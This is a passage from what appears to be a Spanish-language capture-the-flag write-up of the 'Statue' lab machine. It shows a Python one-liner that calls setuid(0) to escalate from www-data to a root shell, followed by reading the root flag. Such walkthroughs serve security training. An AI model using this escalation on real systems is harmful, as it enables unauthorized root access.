www-data@TheHackersLabs-Statue:/home$ /usr/bin/python3.12 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@TheHackersLabs-Statue:/home# whoami
root
```

Ya solamente buscamos la flag del **Root**:
```bash
root@TheHackersLabs-Statue:/home# cd /root
root@TheHackersLabs-Statue:~# ls
root.txt
root@TheHackersLabs-Statue:~# cat root.txt
...
```
Y con esto, terminamos la máquina.
